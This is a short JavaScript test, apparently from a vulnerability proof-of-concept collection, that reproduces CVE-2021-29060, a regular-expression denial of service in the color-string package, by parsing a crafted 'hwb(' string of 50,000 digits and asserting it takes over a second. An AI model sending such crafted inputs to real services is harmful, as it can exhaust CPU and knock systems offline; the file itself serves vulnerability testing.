//https://github.com/yetingli/PoCs/blob/main/CVE-2021-29060/Color-String.md
test("ReDos in color-string", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const colorString = require("color-string")

    let attack_str = "hwb(" + genstr(50000, '1') + "!";

    let t = measureTime(function () {
        let ts =   colorString.get(attack_str)

    });

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});